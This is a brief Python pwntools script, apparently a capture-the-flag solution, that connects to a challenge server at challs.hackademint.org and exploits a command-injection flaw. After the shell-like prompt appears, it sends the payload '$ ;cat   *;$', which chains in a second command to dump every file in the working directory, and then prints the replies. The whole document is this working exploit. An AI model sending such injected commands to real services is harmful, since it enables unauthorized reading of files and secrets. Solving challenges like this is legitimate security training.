from pwn import *

target = remote("challs.hackademint.org", 40005)

target.recvuntil('$ ')
rd = [1, 7, 13, 19]
target.sendline('$ ;cat   *;$')
print(target.recvline())
print(target.recvline())
print(target.recvline())
#target.interactive()
